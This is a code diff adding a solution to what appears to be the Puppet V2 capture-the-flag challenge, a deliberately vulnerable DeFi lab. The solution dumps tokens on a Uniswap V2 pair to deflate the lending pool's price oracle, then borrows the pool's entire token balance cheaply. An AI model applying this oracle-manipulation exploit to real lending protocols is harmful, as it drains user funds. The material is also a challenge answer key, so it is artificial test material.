@@ -98,7 +98,30 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        // https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02
+        uint256 tokenSold = token.balanceOf(player);
+        token.approve(address(uniswapV2Router), tokenSold);
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uint256[] memory previewOut = uniswapV2Router.getAmountsOut(tokenSold, path);
+        uint256[] memory out = uniswapV2Router.swapExactTokensForTokens(tokenSold, previewOut[1], path, player, block.timestamp);
+        assertEq(previewOut[0], out[0]);
+        assertEq(previewOut[1], out[1]);
+        uint256 wethInput = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        weth.deposit{value: player.balance}();
+        weth.approve(address(lendingPool), wethInput);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+        // weth.balanceOf(player) < out[1]
+        weth.approve(address(uniswapV2Router), weth.balanceOf(player));
+        path[0] = address(weth);
+        path[1] = address(token);
+        // weth.balanceOf(player) < out[1]
+        previewOut = uniswapV2Router.getAmountsOut(weth.balanceOf(player), path);
+        out = uniswapV2Router.swapExactTokensForTokens(weth.balanceOf(player), previewOut[1], path, player, block.timestamp);
+        assertEq(previewOut[0], out[0]);
+        assertEq(previewOut[1], out[1]);
     }
 
     /**
